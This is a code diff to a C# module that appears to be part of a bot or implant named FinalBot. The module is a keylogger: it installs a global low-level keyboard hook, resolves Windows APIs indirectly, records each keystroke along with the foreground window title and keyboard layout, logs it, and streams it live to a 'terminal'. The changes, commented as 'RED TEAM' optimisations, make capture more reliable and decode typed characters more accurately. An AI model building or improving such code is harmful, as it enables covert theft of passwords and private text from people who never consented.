@@ -23,6 +23,7 @@ namespace FinalBot.Modules
         public delegate void KeyStrokeHandler(string key);
         public static event KeyStrokeHandler? OnKeyStroke;
         public static bool IsTerminalActive => _isTerminalActive;
+        private static bool _started = false; // Prevent thread leakage
 
         private delegate IntPtr LkProc(int n, IntPtr w, IntPtr l);
 
@@ -40,7 +41,7 @@ namespace FinalBot.Modules
             public static GetForegroundDelegate? GetForeground => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetForegroundDelegate>("GetForegroundWindow");
             public static GetWindowThreadProcessIdDelegate? GetThreadProcess => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetWindowThreadProcessIdDelegate>("GetWindowThreadProcessId");
             public static GetLayoutDelegate? GetLayout => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetLayoutDelegate>("GetKeyboardLayout");
-            public static GetKeyboardStateDelegate? GetKbState => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetKeyboardStateDelegate>("GetKeyboardState");
+            public static GetKeyStateDelegate? GetKeyState => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetKeyStateDelegate>("GetKeyState");
             public static ToUnicodeExDelegate? ToUnicode => VanguardCore.SafetyManager.ApiInterface.GetUser32<ToUnicodeExDelegate>("ToUnicodeEx");
             public static GetWindowTextDelegate? GetText => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetWindowTextDelegate>("GetWindowTextW");
 
@@ -58,7 +59,7 @@ namespace FinalBot.Modules
         private delegate IntPtr GetForegroundDelegate();
         private delegate uint GetWindowThreadProcessIdDelegate(IntPtr hWnd, out uint lpdwProcessId);
         private delegate IntPtr GetLayoutDelegate(uint dwThreadId);
-        private delegate bool GetKeyboardStateDelegate(byte[] lpKeyState);
+        private delegate short GetKeyStateDelegate(int nVirtKey);
         private delegate int ToUnicodeExDelegate(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
         private delegate int GetWindowTextDelegate(IntPtr hWnd, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder lpString, int nMaxCount);
 
@@ -198,15 +199,24 @@ namespace FinalBot.Modules
                     KBDLLHOOKSTRUCT? kbd = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(l);
                     if (kbd.HasValue)
                     {
-                        MonitorWindowChange();
-                        DetectLayoutChange();
-                        string keyName = GetKeyName(kbd.Value.vkCode, kbd.Value.scanCode);
-                        
-                        // Local log
-                        Logger.Log(keyName, "KEY");
-                        
-                        // Direct stream if terminal active
-                        OnKeyStroke?.Invoke(keyName);
+                        // RED TEAM OPTIMIZATION: Instant hand-off to background task
+                        // We must NOT perform any I/O or heavy API calls in this thread.
+                        uint vkCode = kbd.Value.vkCode;
+                        uint scanCode = kbd.Value.scanCode;
+
+                        Task.Run(() => {
+                            try {
+                                MonitorWindowChange();
+                                DetectLayoutChange();
+                                string keyName = GetKeyName(vkCode, scanCode);
+                                
+                                // Local log (Now async via Logger 2.0)
+                                Logger.Log(keyName, "KEY");
+                                
+                                // Direct stream if terminal active
+                                OnKeyStroke?.Invoke(keyName);
+                            } catch { }
+                        });
                     }
                 }
             }
@@ -279,25 +289,36 @@ namespace FinalBot.Modules
             try
             {
                 var toUnicode = Native.ToUnicode;
-                var getKbState = Native.GetKbState;
+                var getKeyState = Native.GetKeyState;
                 var getForeground = Native.GetForeground;
                 var getThreadProcess = Native.GetThreadProcess;
                 var getLayout = Native.GetLayout;
 
-                if (toUnicode != null && getKbState != null)
+                if (toUnicode != null && getKeyState != null)
                 {
+                    // RED TEAM: Capture manual keyboard state because GetKeyboardState() fails in Tasks
                     byte[] kbState = new byte[256];
-                    if (getKbState(kbState))
-                    {
-                        IntPtr foreground = getForeground?.Invoke() ?? IntPtr.Zero;
-                        uint procId;
-                        uint threadId = getThreadProcess != null ? getThreadProcess(foreground, out procId) : 0;
-                        IntPtr layout = getLayout != null ? getLayout(threadId) : IntPtr.Zero;
+                    
+                    // Essential modifiers for Unicode mapping
+                    if ((getKeyState(0x10) & 0x80) != 0) kbState[0x10] = 0x80; // Shift
+                    if ((getKeyState(0x11) & 0x80) != 0) kbState[0x11] = 0x80; // Ctrl
+                    if ((getKeyState(0x12) & 0x80) != 0) kbState[0x12] = 0x80; // Alt
+                    if ((getKeyState(0x14) & 0x01) != 0) kbState[0x14] = 0x01; // CapsLock (Toggled)
+                    if ((getKeyState(0x90) & 0x01) != 0) kbState[0x90] = 0x01; // NumLock
 
-                        var sb = new System.Text.StringBuilder(16);
-                        int result = toUnicode(vkCode, scanCode, kbState, sb, sb.Capacity, 0, layout);
-                        
-                        if (result > 0) return sb.ToString();
+                    IntPtr foreground = getForeground?.Invoke() ?? IntPtr.Zero;
+                    uint procId;
+                    uint threadId = getThreadProcess != null ? getThreadProcess(foreground, out procId) : 0;
+                    IntPtr layout = getLayout != null ? getLayout(threadId) : IntPtr.Zero;
+
+                    var sb = new System.Text.StringBuilder(16);
+                    int result = toUnicode(vkCode, scanCode, kbState, sb, sb.Capacity, 0, layout);
+                    
+                    if (result > 0) return sb.ToString();
+                    if (result == -1) // Dead key (combination)
+                    {
+                        // Clean up internal buffer to prevent artifacts
+                        toUnicode(vkCode, scanCode, kbState, sb, sb.Capacity, 0, layout);
                     }
                 }
             }
